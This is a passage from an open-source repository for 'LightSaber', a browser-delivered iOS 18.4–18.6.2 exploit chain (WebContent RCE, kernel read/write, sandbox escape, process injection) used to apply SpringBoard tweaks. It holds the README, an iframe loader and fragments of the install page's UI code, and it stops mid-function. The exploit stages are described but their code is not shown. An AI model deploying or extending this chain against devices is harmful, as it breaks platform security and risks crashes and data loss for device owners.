`README.md`:

```md
# LightSaber

**[zeroxjf.github.io/lightsaber](https://zeroxjf.github.io/lightsaber/)**

iOS 18.4 - 18.6.2 userland exploit chain with JavaScript injection that modifies SpringBoard and other system processes at runtime. Open source, derived from [DarkSword](https://iverify.io/blog/darksword-ios-exploit-kit-explained) with all malware communication stripped.

> **This is not tweak injection.** It is runtime JS modification through an exploit chain. Changes persist until respring or reboot - this is not dylib injection like a full jailbreak.

## Supported devices

Every arm64e iPhone (A12 - A18 Pro) running iOS 18.4 - 18.6.2.

## Roadmap

> **To do**
>
> - [ ] Improve chain reliability and reproducibility
> - [ ] Add offsets to support more iOS 18.x versions
> - [ ] Get StatBar functional (data reporting works but UI display hits nonstop PAC violations)
> - [ ] Resolve compatibility issues with Nugget and similar tools

> **Done**
>
> - [x] Full WebContent RCE → kernel R/W → sandbox escape chain
> - [x] SBCustomizer (dock icons, home grid columns/rows, hide labels)
> - [x] Powercuff battery saver (4 throttle levels via thermalmonitord)
> - [x] Multi-tweak picker with single chain execution
> - [x] Support for every arm64e iPhone on iOS 18.4 - 18.6.2
> - [x] #cloutfarmed

## How it works

LightSaber chains a WebContent RCE into kernel R/W via sandbox escape, then uses a JSC + `objc_msgSend` / `dlsym` native bridge to inject JavaScript into other processes (SpringBoard, mediaplaybackd, thermalmonitord, etc.).

### Chain stages

| Stage | Where | What |
|---|---|---|
| `index.html` | Safari main page | Install card UI, tweak picker, gating |
| `rce_loader.js` | WebContent iframe | URL parser, postMessage routing, exploit bootstrap |
| `rce_worker*.js` | WebContent worker | JavaScriptCore exploit, addrof/fakeobj/read64/write64 primitives |
| `rce_module*.js` | WebContent worker | Heap shaping, PAC gadget signing |
| `sbx0_main_18.4.js` | WebContent worker | Sandbox escape |
| `sbx1_main.js` | mediaplaybackd | Prelude builder, kernel R/W, process injection bridge |
| `pe_main.js` | mediaplaybackd | Payload dispatch, `inject*Payload` helpers |
| `*_light.js` | Target processes | Tweak payloads (run via the native bridge) |

## Available tweaks

### SBCustomizer

Runtime SpringBoard layout customization: dock icon count, home screen columns and rows, hide icon labels. Patched once during chain execution.

### Powercuff

Port of [rpetrich's Powercuff](https://github.com/rpetrich/Powercuff). Underclocks CPU/GPU via thermalmonitord for extended battery life. Four levels: nominal, light, moderate, heavy. Lasts until reboot.

## Usage

Visit [zeroxjf.github.io/lightsaber](https://zeroxjf.github.io/lightsaber/) in Safari on a supported device. Pick your tweaks, tap **Install Selected**, and keep Safari in the foreground for up to 60 seconds while the chain runs.

**If it fails** (page flash, "A problem repeatedly occurred", or "webpage crashed" banner): clear Safari's cache (book icon > Clear), reload, and retry. If it keeps failing, reboot, clear cache again, and try once more.

## Debugging with syslog.py

`syslog.py` is a filtered device syslog viewer that shows only chain-relevant log lines. Requires a Mac with `idevicesyslog` installed (`brew install libimobiledevice`) and the device connected via USB.

```bash
python3 syslog.py
```

Each run creates a timestamped log file in `logs/` (e.g. `logs/syslog_2026-04-09_15-37-00.txt`). Log tags are color-coded:

- **Green** `[PE]` `[PE-DBG]` - post-exploit / kernel phase
- **Magenta** `[SBX1]` `SBX0` - sandbox escape stages
- **Cyan** `[SBC]` `[POWERCUFF]` `[MG]` `[APPLIMIT]` - tweak payloads
- **Red** - crashes, PAC violations, JS errors

See [`logs/example_successful_run.txt`](logs/example_successful_run.txt) for what a successful chain run looks like.

## Project structure

```
index.html              Main install page (Safari UI)
frame.html              Exploit iframe shell
rce_loader.js           Iframe-side bootstrap + postMessage router
rce_worker.js           WebContent worker (iOS 18.4)
rce_worker_18.6.js      WebContent worker (iOS 18.5-18.6.2)
rce_module.js           Heap shaping module (18.4)
rce_module_18.6.js      Heap shaping module (18.5-18.6.2)
sbx0_main_18.4.js       Sandbox escape
sbx1_main.js            Kernel R/W + process injection bridge
pe_main.js              Payload dispatch in mediaplaybackd
powercuff_light.js      Powercuff payload
sbcustomizer_light.js   SBCustomizer payload
colorbanners_light.js   ColorBanners payload (WIP)
syslog.py               Device syslog capture helper
```

`frame.html`:

```html
<!DOCTYPE html>
<html>
<head>
  <title></title>
</head>
<body>
  <script type="text/javascript">document.write('<script defer=\"defer\" src=\"rce_loader.js?'+Date.now()+'\"\>\<\/script\>');</script>
</body>
</html>

```

      margin-top: 8px;
    }
    .tweak-row-notes a { color: var(--muted); }
    .tweak-row-notes strong { color: var(--muted); font-weight: 600; }
  </style>
</head>

      <div class="tip">
        <div class="tip-icon">i</div>
        <div class="tip-body">
          <strong>Tip:</strong> takes up to 60 seconds. Keep Safari in the foreground while it runs &mdash; don't switch apps or lock the device. If it works, don't press your luck.<br><br>
          <strong>Expect multiple attempts.</strong> This is a kernel exploit chain &mdash; it genuinely can take up to 5 tries before it lands. Kill Safari from the app switcher between attempts, reopen, and try again. That's normal.<br><br>
          <strong>If it keeps failing:</strong> clear Safari's cache (book icon &rarr; Clear), reload this page, and retry. If it still won't land after several attempts, reboot the device, clear the cache again, and start fresh.
        </div>
      </div>

    <details class="disclaimer">
      <summary><strong>Not tweak injection</strong> &mdash; runtime JS modification only</summary>
      <div class="details-body">
        This is JavaScript injection during the exploit chain that modifies processes at runtime. While changes persist until respring or reboot, this is not a standard dylib injection found with a full jailbreak &mdash; it is limited in nature and only some things can be done with it.
      </div>
    </details>

    <details class="caution">
      <summary><strong>Compatibility warning</strong> &mdash; may conflict with Nugget</summary>
      <div class="details-body">
        This may cause compatibility issues with modifications made by <a href="https://github.com/leminlimez/Nugget" target="_blank" rel="noopener">Nugget</a> and other similar tools. While I will work on resolving this, keep this in mind in the interim.
      </div>
    </details>

    <details class="warning">
      <summary><strong>Use caution</strong> &mdash; unstable, not for daily drivers</summary>
      <div class="details-body">
        Derived from the <a href="https://iverify.io/blog/darksword-ios-exploit-kit-explained">DarkSword</a> exploit chain with all malware communication stripped and <a href="https://github.com/zeroxjf/LightSaber">fully open source</a>, but this is an inherently unstable chain and is <strong>not recommended for deployment on a daily driver</strong> unless you are willing to accept the risk. The chain may take several tries to succeed, SpringBoard may crash, the kernel may panic. Use at your own risk &mdash; I am not liable for any damage or data loss.
      </div>
    </details>

      <h2>Before you continue</h2>
      <p class="intro-sub">Please read the following before using LightSaber.</p>
      <div class="disclaimer">
        <strong>This is not tweak injection.</strong> This is JavaScript injection during the exploit chain that modifies processes at runtime. While changes persist until respring or reboot, this is not a standard dylib injection found with a full jailbreak &mdash; it is limited in nature and only some things can be done with it.
      </div>

      </div>

        <strong>Use caution.</strong> Derived from the <a href="https://iverify.io/blog/darksword-ios-exploit-kit-explained">DarkSword</a> exploit chain with all malware communication stripped and <a href="https://github.com/zeroxjf/LightSaber">fully open source</a>, but this is an inherently unstable chain and is <strong>not recommended for deployment on a daily driver</strong> unless you are willing to accept the risk. The chain may take several tries to succeed, SpringBoard may crash, the kernel may panic. Use at your own risk &mdash; I am not liable for any damage or data loss.

  <div id="killSafariOverlay" class="overlay">
    <div class="dialog">
      <h2 style="color:#b91c1c">Force-close Safari</h2>
      <p>Safari got corrupted during a recent failed run. Reusing it can kernel-panic the device. From the app switcher, swipe up on Safari to kill the process, then reopen and try again.</p>
      <div class="dialog-btns">
        <button class="btn-confirm" onclick="dismissKillSafari()">Got it</button>
      </div>
    </div>
  </div>

  <script>
    // Force the page to start at the top on every load, even if Safari
    // tries to restore the previous scroll position from cache. iOS Safari
    // restores scroll position aggressively for back-forward / bfcache
    // navigations and can also leave the URL bar mid-collapse, both of
    // which were leaving the LightSaber header partially scrolled out of
    // view on first paint. Disabling history.scrollRestoration plus three
    // explicit scrollTo(0,0) calls (immediate, on DOMContentLoaded, and
    // on the load event) covers every iOS Safari path I've seen.
    try { if ('scrollRestoration' in history) history.scrollRestoration = 'manual'; } catch(e) {}
    window.scrollTo(0, 0);
    document.addEventListener('DOMContentLoaded', function() { window.scrollTo(0, 0); });
    window.addEventListener('load', function() { window.scrollTo(0, 0); });
    window.addEventListener('pageshow', function() { window.scrollTo(0, 0); });
    // Show the intro warnings overlay on first visit. Persists dismissal in
    // localStorage so it survives Safari kills + device reboots and only
    // comes back if the user fully clears Safari's website data / cache.
    // sessionStorage would re-prompt on every Safari kill, which got annoying.
    (function() {
      var dismissed = false;
      try { dismissed = localStorage.getItem('ls_intro_dismissed') === '1'; } catch(e) {}
      if (!dismissed) {
        var el = document.getElementById('introOverlay');
        if (el) el.className = 'overlay active';
      }
    })();
    function dismissIntro() {
      try { localStorage.setItem('ls_intro_dismissed', '1'); } catch(e) {}
      var el = document.getElementById('introOverlay');
      if (el) el.className = 'overlay';
      window.scrollTo(0, 0);
    }
    var ua = navigator.userAgent;
    var iosMatch = /iPhone OS ([0-9_]+)/g.exec(ua);
    var iosVer = iosMatch ? iosMatch[1].replace(/_/g, '.') : null;
    var iosParts = iosVer ? iosVer.split('.').map(Number) : [0,0,0];
    var major = iosParts[0], minor = iosParts[1], patch = iosParts[2] || 0;
    var isIphone = /iPhone/.test(ua);
    var doneSignal = false;
    /* log UI disabled for now
    var syslogPollTimer = null;
    var lastSyslogText = '';
    var seenDeviceLines = {};
    var syslogCandidates = ['syslog.txt', '../syslog.txt', '/syslog.txt', '/lightsaber/syslog.txt'];
    var activeSyslogPath = null;

    function logAppend(text, cls) {
      var el = document.getElementById('logScroll');
      var line = document.createElement('div');
      line.className = 'log-line' + (cls ? ' ' + cls : '');
      line.textContent = text;
      el.appendChild(line);
      el.scrollTop = el.scrollHeight;
    }

    function classifyLogLine(text) {
      var msg = (text || '').toLowerCase();
      if (msg.indexOf('mediaplaybackd') !== -1 || msg.indexOf('[pe]') !== -1 || msg.indexOf('pe-dbg') !== -1) return 'pe';
      if (msg.indexOf('springboard') !== -1 || msg.indexOf('[fiveicon]') !== -1 || msg.indexOf('injectjs') !== -1) return 'springboard';
      if (msg.indexOf('kernel') !== -1 || msg.indexOf('sbx0:') !== -1 || msg.indexOf('sbx1:') !== -1 || msg.indexOf('[mpd]') !== -1 || msg.indexOf('[profiler]') !== -1) return 'kernel';
      if (msg.indexOf('webcontent') !== -1 || msg.indexOf('[msg]') !== -1) return 'device';
      return '';
    }

    function appendSyslogText(fullText) {
      if (!fullText) return;
      var lines = fullText.split(/\r?\n/);
      for (var i = 0; i < lines.length; i++) {
        var line = lines[i];
        if (!line) continue;
        if (seenDeviceLines[line]) continue;
        seenDeviceLines[line] = 1;
        logAppend(line, classifyLogLine(line));
      }
    }

    function handleSyslogResponse(path, text) {
      if (!text) return false;
      if (!activeSyslogPath) {
        activeSyslogPath = path;
        logAppend('[UI] Using syslog source: ' + path, 'device');
      }
      if (text === lastSyslogText) return true;
      if (!lastSyslogText || text.indexOf(lastSyslogText) !== 0) {
        appendSyslogText(text);
      } else {
        appendSyslogText(text.slice(lastSyslogText.length));
      }
      lastSyslogText = text;
      return true;
    }

    function tryPollSyslogAt(index) {
      if (index >= syslogCandidates.length) return;
      var path = syslogCandidates[index];
      var xhr = new XMLHttpRequest();
      xhr.open('GET', path + '?' + Date.now(), true);
      xhr.onreadystatechange = function() {
        if (xhr.readyState !== 4) return;
        if (xhr.status >= 200 && xhr.status < 300) {
          var text = xhr.responseText || '';
          if (handleSyslogResponse(path, text)) return;
        }
        if (!activeSyslogPath) tryPollSyslogAt(index + 1);
      };
      try { xhr.send(null); } catch (e) {
        if (!activeSyslogPath) tryPollSyslogAt(index + 1);
      }
    }

    function pollSyslog() {
      if (activeSyslogPath) {
        tryPollSyslogAt(syslogCandidates.indexOf(activeSyslogPath) >= 0 ? syslogCandidates.indexOf(activeSyslogPath) : 0);
      } else {
        tryPollSyslogAt(0);
      }
    }

    function startSyslogPolling() {
      stopSyslogPolling();
      lastSyslogText = '';
      seenDeviceLines = {};
      activeSyslogPath = null;
      pollSyslog();
      syslogPollTimer = setInterval(pollSyslog, 1000);
    }

    function stopSyslogPolling() {
      if (syslogPollTimer) {
        clearInterval(syslogPollTimer);
        syslogPollTimer = null;
      }
    }
    */

    var supportMsg = document.getElementById('supportMsg');
    var canRun = false;

    var supportText = '';
    var supportColor = '';
    if (!isIphone) {
      supportColor = '#b91c1c';
      supportText = 'Not an iPhone';
    } else if (major < 18 || (major === 18 && minor < 4)) {
      supportColor = '#b91c1c';
      supportText = 'iOS ' + iosVer + ' \u2014 not supported';
    } else if (major === 18 && minor >= 4 && (minor < 6 || (minor === 6 && patch <= 2))) {
      supportColor = '#15803d';
      supportText = 'iOS ' + iosVer + ' \u2014 supported';
      canRun = true;
    } else {
      supportColor = '#b91c1c';
      supportText = 'iOS ' + iosVer + ' \u2014 not yet supported';
    }
    supportMsg.style.color = supportColor;
    supportMsg.style.fontWeight = '600';
    supportMsg.textContent = supportText;

    var runBtn = document.getElementById('runBtn');
    if (!canRun) {
      runBtn.className = 'btn btn-disabled';
      runBtn.textContent = 'Not available';
      runBtn.onclick = null;
    }

    // Wire tweak rows. Each row has two independent interactive areas in its
    // head: the title button (tap = expand/collapse the description detail
    // below) and the iOS-style toggle switch (tap = enable/disable the tweak).
    // The .checked class is still driven by the hidden checkbox so the
    // selected row highlights and any inline options (e.g. Powercuff Level)
    // slide into view when the toggle is on.
    var tweakRows = [
      { rowId: 'tweakRowFiveicon', cbId: 'tweakFiveicon', name: 'fiveicon' },
      { rowId: 'tweakRowPowercuff', cbId: 'tweakPowercuff', name: 'powercuff' },
      { rowId: 'tweakRowMgpatcher', cbId: 'tweakMgpatcher', name: 'mgpatcher' },
      { rowId: 'tweakRowApplimit', cbId: 'tweakApplimit', name: 'applimit' }
    ];
    function syncTweakRow(row) {
      var el = document.getElementById(row.rowId);
      var cb = document.getElementById(row.cbId);
      if (!el || !cb) return;
      if (cb.checked) el.classList.add('checked');
      else el.classList.remove('checked');
      // Sync queue button state
      var btn = el.querySelector('.tweak-queue-btn[data-cb="' + row.cbId + '"]');
      if (btn) {
        if (cb.checked) { btn.textContent = 'QUEUED'; btn.classList.add('queued'); }
        else { btn.textContent = 'GET'; btn.classList.remove('queued'); }
      }
    }
    // Sheet names for each tweak row
    var tweakSheetNames = {
      tweakRowFiveicon: 'SBCustomizer',
      tweakRowPowercuff: 'Powercuff',
      tweakRowMgpatcher: 'MobileGestalt Patcher',
      tweakRowApplimit: '3-App Limit Bypass'
    };
    var _sheetSourceRow = null;
    var _sheetChanged = false;
    function openTweakSheet(rowId) {
      var row = document.getElementById(rowId);
      if (!row) return;
      _sheetChanged = false;
      var detail = row.querySelector('.tweak-row-detail');
      var options = row.querySelector('.tweak-row-options');
      var body = document.getElementById('tweakSheetBody');
      body.innerHTML = '';
      if (detail) { var clone = detail.cloneNode(false); clone.removeAttribute('hidden'); body.appendChild(detail); detail.removeAttribute('hidden'); }
      if (options) body.appendChild(options);
      _sheetSourceRow = row;
      document.getElementById('tweakSheetTitle').textContent = tweakSheetNames[rowId] || '';
      document.getElementById('tweakSheetBackdrop').classList.add('active');
      document.getElementById('tweakSheet').classList.add('active');
    }
    // Track any input changes inside the sheet
    document.getElementById('tweakSheet').addEventListener('change', function() { _sheetChanged = true; });
    document.getElementById('tweakSheet').addEventListener('input', function() { _sheetChanged = true; });
    function closeTweakSheet() {
      // Auto-queue the tweak if the user changed any setting
      if (_sheetChanged && _sheetSourceRow) {
        var rowId = _sheetSourceRow.id;
        for (var ri = 0; ri < tweakRows.length; ri++) {
          if (tweakRows[ri].rowId === rowId) {
            var cb = document.getElementById(tweakRows[ri].cbId);
            if (cb && !cb.checked) {
              cb.checked = true;
              cb.dispatchEvent(new Event('change'));
              syncTweakRow(tweakRows[ri]);
            }
            break;
          }
        }
      }
      _sheetChanged = false;
      document.getElementById('tweakSheetBackdrop').classList.remove('active');
      document.getElementById('tweakSheet').classList.remove('active');
      // Move content back to source row after transition
      setTimeout(function() {
        if (!_sheetSourceRow) return;
        var body = document.getElementById('tweakSheetBody');
        while (body.firstChild) _sheetSourceRow.appendChild(body.firstChild);
        // Re-hide detail
        var detail = _sheetSourceRow.querySelector('.tweak-row-detail');
        if (detail) detail.setAttribute('hidden', '');
        _sheetSourceRow = null;
      }, 320);
    }
    document.getElementById('tweakSheetBack').addEventListener('click', closeTweakSheet);
    document.getElementById('tweakSheetBackdrop').addEventListener('click', closeTweakSheet);

    // Clear all queued tweaks
    document.getElementById('clearQueueBtn').addEventListener('click', function() {
      if (!confirm('Clear all queued tweaks?')) return;
      for (var ci = 0; ci < tweakRows.length; ci++) {
        var cb = document.getElementById(tweakRows[ci].cbId);
        if (cb && cb.checked) {
          cb.checked = false;
          cb.dispatchEvent(new Event('change'));
        }
        syncTweakRow(tweakRows[ci]);
      }
    });

    for (var ti = 0; ti < tweakRows.length; ti++) {
      (function(row) {
        var cb = document.getElementById(row.cbId);
        if (cb) {
          cb.addEventListener('change', function() { syncTweakRow(row); });
          syncTweakRow(row);
        }
        var el = document.getElementById(row.rowId);
        if (el) {
          el.addEventListener('click', function(e) {
            // Don't open sheet if clicking the queue button
            if (e.target.closest('.tweak-queue-btn')) return;
            e.preventDefault();
            openTweakSheet(row.rowId);
          });
        }
      })(tweakRows[ti]);
    }

    // Wire queue buttons: toggle hidden checkbox + update button text/style
    document.querySelectorAll('.tweak-queue-btn[data-cb]').forEach(function(btn) {
      var cbId = btn.getAttribute('data-cb');
      var cb = document.getElementById(cbId);
      if (!cb) return;
      function syncBtn() {
        if (cb.checked) { btn.textContent = 'QUEUED'; btn.classList.add('queued'); }
        else { btn.textContent = 'GET'; btn.classList.remove('queued'); }
      }
      btn.addEventListener('click', function(e) {
        e.stopPropagation();
        // Block queueing if user hasn't adjusted settings from defaults
        if (!cb.checked) {
          if (cbId === 'tweakFiveicon') {
            var di = parseInt((document.getElementById('sbcDockIcons') || {}).value, 10) || 4;
            var hc = parseInt((document.getElementById('sbcHsCols') || {}).value, 10) || 4;
            var hr = parseInt((document.getElementById('sbcHsRows') || {}).value, 10) || 6;
            var hl = !!(document.getElementById('sbcHideLabels') || {}).checked;
            if (di === 4 && hc === 4 && hr === 6 && !hl) {
              alert('Adjust at least one setting first (dock icons, columns, rows, or hide labels). Tap the row to open options.');
              return;
            }
          }
          if (cbId === 'tweakMgpatcher') {
            var mgCbIds = ['mgBootChime','mgChargeLimit','mgTapToWake','mgCollisionSOS','mgPencil','mgActionButton','mgAOD','mgStageManager','mgInternalInstall','mgSRD','mgShutter','mgiPadApps'];
            var anyChecked = false;
            for (var mi = 0; mi < mgCbIds.length; mi++) {
              if ((document.getElementById(mgCbIds[mi]) || {}).checked) { anyChecked = true; break; }
            }
            if (!anyChecked) {
              if (!confirm('No flags checked. All patched MobileGestalt keys will be removed so the device queries real hardware values. Respring to apply.')) return;
            }
          }
        }
        cb.checked = !cb.checked;
        cb.dispatchEvent(new Event('change'));
        syncBtn();
      });
      syncBtn();
      cb.addEventListener('change', syncBtn);
    });
    // Slider binding: keep the display value in sync with the native range
    // input, live while dragging. The count constants are used by both the
    // initial wiring and the reset handler so they stay in one place.
    var SBC_DEFAULTS = { sbcDockIcons: 4, sbcHsCols: 4, sbcHsRows: 6 };
    function sbcWireSlider(sliderEl) {
      var valueEl = document.getElementById(sliderEl.id + 'Val');
      function refresh() {
        if (valueEl) valueEl.textContent = String(sliderEl.value);
      }
      sliderEl.addEventListener('input', refresh);
      sliderEl.addEventListener('change', refresh);
      refresh();
    }
    var sbcSliders = document.querySelectorAll('.sbc-slider');
    for (var si = 0; si < sbcSliders.length; si++) sbcWireSlider(sbcSliders[si]);

    // Reset button - restores sliders to their stock defaults and clears
    // the hide-icon-labels toggle. Fires a synthetic change event on each
    // control so the lsSaveState listener persists the reset.
    var sbcResetBtn = document.getElementById('sbcResetBtn');
    if (sbcResetBtn) {
      sbcResetBtn.addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        Object.keys(SBC_DEFAULTS).forEach(function(id) {
          var el = document.getElementById(id);
          if (!el) return;
          el.value = String(SBC_DEFAULTS[id]);
          var valEl = document.getElementById(id + 'Val');
          if (valEl) valEl.textContent = String(SBC_DEFAULTS[id]);
        });
        var hideLabelsEl = document.getElementById('sbcHideLabels');
        if (hideLabelsEl) hideLabelsEl.checked = false;
        lsSaveState();
      });
    }

    // Persist UI selections across Safari kills via localStorage so the
    // user's toggles/steppers don't reset every time they relaunch.
    var LS_STATE_KEY = 'ls_ui_state_v1';
    function lsSaveState() {
      try {
        var state = {
          fiveicon: !!document.getElementById('tweakFiveicon').checked,
          powercuff: !!document.getElementById('tweakPowercuff').checked,
          powercuffLevel: (document.getElementById('powercuffLevel') || {}).value || 'heavy',
          dockIcons: parseInt((document.getElementById('sbcDockIcons') || {}).value, 10) || 4,
          hsCols: parseInt((document.getElementById('sbcHsCols') || {}).value, 10) || 4,
          hsRows: parseInt((document.getElementById('sbcHsRows') || {}).value, 10) || 6,
          hideLabels: !!(document.getElementById('sbcHideLabels') || {}).checked,
          mgpatcher: !!document.getElementById('tweakMgpatcher').checked,
          applimit: !!document.getElementById('tweakApplimit').checked,
          mgBootChime: !!(document.getElementById('mgBootChime') || {}).checked,
          mgChargeLimit: !!(document.getElementById('mgChargeLimit') || {}).checked,
          mgTapToWake: !!(document.getElementById('mgTapToWake') || {}).checked,
          mgCollisionSOS: !!(document.getElementById('mgCollisionSOS') || {}).checked,
          mgPencil: !!(document.getElementById('mgPencil') || {}).checked,
          mgActionButton: !!(document.getElementById('mgActionButton') || {}).checked,
          mgAOD: !!(document.getElementById('mgAOD') || {}).checked,
          mgStageManager: !!(document.getElementById('mgStageManager') || {}).checked,
          mgInternalInstall: !!(document.getElementById('mgInternalInstall') || {}).checked,
          mgSRD: !!(document.getElementById('mgSRD') || {}).checked,
          mgShutter: !!(document.getElementById('mgShutter') || {}).checked,
          mgiPadApps: !!(document.getElementById('mgiPadApps') || {}).checked
        };
        localStorage.setItem(LS_STATE_KEY, JSON.stringify(state));
      } catch (e) {}
    }
    function lsLoadState() {
      try {
        var raw = localStorage.getItem(LS_STATE_KEY);
        if (!raw) return;
        var s = JSON.parse(raw);
        if (!s) return;
        if (typeof s.fiveicon === 'boolean') document.getElementById('tweakFiveicon').checked = s.fiveicon;
        if (typeof s.powercuff === 'boolean') document.getElementById('tweakPowercuff').checked = s.powercuff;
        var hlEl = document.getElementById('sbcHideLabels');
        if (hlEl && typeof s.hideLabels === 'boolean') hlEl.checked = s.hideLabels;
        if (typeof s.mgpatcher === 'boolean') document.getElementById('tweakMgpatcher').checked = s.mgpatcher;
        if (typeof s.applimit === 'boolean') document.getElementById('tweakApplimit').checked = s.applimit;
        var mgCbIds = ['mgBootChime','mgChargeLimit','mgTapToWake','mgCollisionSOS','mgPencil','mgActionButton','mgAOD','mgStageManager','mgInternalInstall','mgSRD','mgShutter','mgiPadApps'];
        for (var mgi = 0; mgi < mgCbIds.length; mgi++) {
          var mgEl = document.getElementById(mgCbIds[mgi]);
          if (mgEl && typeof s[mgCbIds[mgi]] === 'boolean') mgEl.checked = s[mgCbIds[mgi]];
        }
        // Programmatic .checked = ... does not fire 'change', so manually
        // re-run the same row-sync logic that runs on a real toggle so the
        // tweak row visually matches its checked state (options panel
        // shown, .checked class applied, etc.).
        for (var ri = 0; ri < tweakRows.length; ri++) syncTweakRow(tweakRows[ri]);
        var lvl = document.getElementById('powercuffLevel');
        if (lvl && typeof s.powercuffLevel === 'string') lvl.value = s.powercuffLevel;
        function applySlider(id, val) {
          var el = document.getElementById(id);
          if (!el || typeof val !== 'number') return;
          var min = parseInt(el.getAttribute('min'), 10);
          var max = parseInt(el.getAttribute('max'), 10);
          var n = val;
          if (!isFinite(n)) n = min;
          if (n < min) n = min;
          if (n > max) n = max;
          el.value = String(n);
          var valueEl = document.getElementById(id + 'Val');
          if (valueEl) valueEl.textContent = String(n);
        }
        applySlider('sbcDockIcons', s.dockIcons);
        applySlider('sbcHsCols', s.hsCols);
        applySlider('sbcHsRows', s.hsRows);
      } catch (e) {}
    }
    lsLoadState();

    // Auto-show kill Safari prompt if a previous chain run left dirty state
    try {
      if (sessionStorage.getItem('ls_running')) {
        showKillSafari();
      }
    } catch(e) {}
    ['tweakFiveicon','tweakPowercuff','powercuffLevel','sbcHideLabels','tweakMgpatcher','tweakApplimit','mgBootChime','mgChargeLimit','mgTapToWake','mgCollisionSOS','mgPencil','mgActionButton','mgAOD','mgStageManager','mgInternalInstall','mgSRD','mgShutter','mgiPadApps'].forEach(function(id) {
      var el = document.getElementById(id);
      if (el) el.addEventListener('change', lsSaveState);
    });
    // Native range inputs fire 'change' on release, 'input' continuously
    // while dragging. Persist on 'change' so we don't spam localStorage.
    document.querySelectorAll('.sbc-slider').forEach(function(sl) {
      sl.addEventListener('change', lsSaveState);
    });
    function sbcClampInput(id, lo, hi, def) {
      var el = document.getElementById(id);
      if (!el) return def;
      var n = parseInt(el.value, 10);
      if (!isFinite(n)) n = def;
      if (n < lo) n = lo;
      if (n > hi) n = hi;
      el.value = String(n);
      return n;
    }

    window.scrollTo(0, 0);

    function gatherSelection() {
      var tweaks = [];
      for (var i = 0; i < tweakRows.length; i++) {
        var cb = document.getElementById(tweakRows[i].cbId);
        if (cb && cb.checked) tweaks.push(tweakRows[i].name);
      }
      var levelSel = document.getElementById('powercuffLevel');
      var level = levelSel ? levelSel.value : 'heavy';
      var sbc = {
        dock_icons: sbcClampInput('sbcDockIcons', 4, 7, 4),
        hs_cols: sbcClampInput('sbcHsCols', 3, 7, 4),
        hs_rows: sbcClampInput('sbcHsRows', 4, 8, 6),
        hide_labels: !!(document.getElementById('sbcHideLabels') || {}).checked ? 1 : 0
      };
      var mgFlags = [];
      var mgUnflags = [];
      var mgIds = ['mgBootChime','mgChargeLimit','mgTapToWake','mgCollisionSOS','mgPencil','mgActionButton','mgAOD','mgStageManager','mgInternalInstall','mgSRD','mgShutter','mgiPadApps'];
      for (var mi = 0; mi < mgIds.length; mi++) {
        var mgCb = document.getElementById(mgIds[mi]);
        var fname = mgIds[mi].replace('mg','').toLowerCase();
        if (mgCb && mgCb.checked) mgFlags.push(fname);
        else mgUnflags.push(fname);
      }
      return { tweaks: tweaks, level: level, sbc: sbc, mg_flags: mgFlags.join(','), mg_unflags: mgUnflags.join(',') };
    }

    function markDone() {
      if (doneSignal) return;
      doneSignal = true;
      // stopSyslogPolling();
      try { sessionStorage.removeItem('ls_running'); } catch(e) {}
      var installStatusEl = document.getElementById('installStatus');
      if (installStatusEl) {
        installStatusEl.textContent = '';
        installStatusEl.classList.remove('error');
        installStatusEl.dataset.sbxDone = '';
      }
      var btn = document.getElementById('runBtn');
      if (btn) {
        btn.textContent = 'Installed';
        btn.className = 'btn btn-done';
      }
    }

    // Mirrors the sbx0 printf-via-sandbox-deny breadcrumb that fires right
    // after SBX0 lands (the last log line that reliably makes it out before
    // Safari freezes during PE / SpringBoard injection). rce_loader.js
    // forwards every worker 'log' postMessage to this window as
    // {type:'lightsaber_log', text}, so we just substring match the stage
    // tag and update the install card.
    function handleProgressLog(text) {
      if (!text || typeof text !== 'string') return;
      if (text.indexOf('sbx0: [+] SBX0 complete') === -1) return;
      var el = document.getElementById('installStatus');
      if (!el) return;
      if (el.dataset.sbxDone === '1') return;
      el.dataset.sbxDone = '1';
      el.classList.remove('error');
      el.textContent = 'kernel exploit + sandbox escape underway, attempting install. Safari will freeze, wait ~30 more seconds to see if changes took hold';
    }

    window.addEventListener('message', function(event) {
      var data = event.data || {};
      if (data.type === 'lightsaber_done') markDone();
      if (data.type === 'lightsaber_log') handleProgressLog(data.text);
    });

    function confirmInstall() {
      if (!canRun) return;
      var sel = gatherSelection();
      var statusEl = document.getElementById('installStatus');
      if (sel.tweaks.length === 0) {
        if (statusEl) {
          statusEl.classList.add('error');
          statusEl.textContent = 'Select at least one tweak to install.';
        }
        return;
      }
      if (statusEl) {
        statusEl.classList.remove('error');
        statusEl.textContent = '';
      }
      // If a previous chain run left ls_running set, Safari is in a dirty
      // state and the user has to force-quit it before anything else will
      // work. Skip the "Are you sure?" confirm in that case and go straight
      // to the kill-safari prompt - that's the only useful action available.
      try {
        if (sessionStorage.getItem('ls_running')) {
          showKillSafari();
          return;
        }
      } catch(e) {}
      try {
        if (localStorage.getItem('ls_confirmed_once')) {
          var sel2 = gatherSelection();
          runExploit(sel2.tweaks, sel2.level, sel2.sbc, sel2.mg_flags, sel2.mg_unflags);
          return;
        }
      } catch(e) {}
      document.getElementById('confirmOverlay').className = 'overlay active';
    }

    function dismissConfirm() {
      document.getElementById('confirmOverlay').className = 'overlay';
    }

    function proceedInstall() {
      document.getElementById('confirmOverlay').className = 'overlay';
      try { localStorage.setItem('ls_confirmed_once', '1'); } catch(e) {}
      var sel = gatherSelection();
      runExploit(sel.tweaks, sel.level, sel.sbc, sel.mg_flags, sel.mg_unflags);
    }

    function showKillSafari() {
      var btn = document.getElementById('runBtn');
      if (btn && canRun) {
        btn.className = 'btn btn-run';
        btn.textContent = 'Install Selected';
      }
      document.getElementById('killSafariOverlay').className = 'overlay active';
    }

    function dismissKillSafari() {
      document.getElementById('killSafariOverlay').className = 'overlay';
    }

    function runExploit(tweaks, level, sbc, mg_flags, mg_unflags) {
      if (!canRun) return;
      if (!tweaks || tweaks.length === 0) tweaks = ['fiveicon'];
      level = level || 'heavy';
      sbc = sbc || { dock_icons: 4, hs_cols: 4, hs_rows: 6, hide_labels: 0 };
      mg_flags = mg_flags || '';
      mg_unflags = mg_unflags || '';
      var installStatusEl = document.getElementById('installStatus');
      try {
        if (sessionStorage.getItem('ls_running')) {
          if (installStatusEl) {
            installStatusEl.classList.remove('error');
            installStatusEl.textContent = '';
          }
          showKillSafari();
          return;
        }
      } catch(e) {}
      doneSignal = false;
      if (installStatusEl) {
        installStatusEl.classList.remove('error');
        installStatusEl.textContent = 'WebKit exploit \u2192 sandbox escape \u2192 kernel exploit \u2192 process injection is underway\u2026';
      }
      var btn = document.getElementById('runBtn');
      if (btn) {
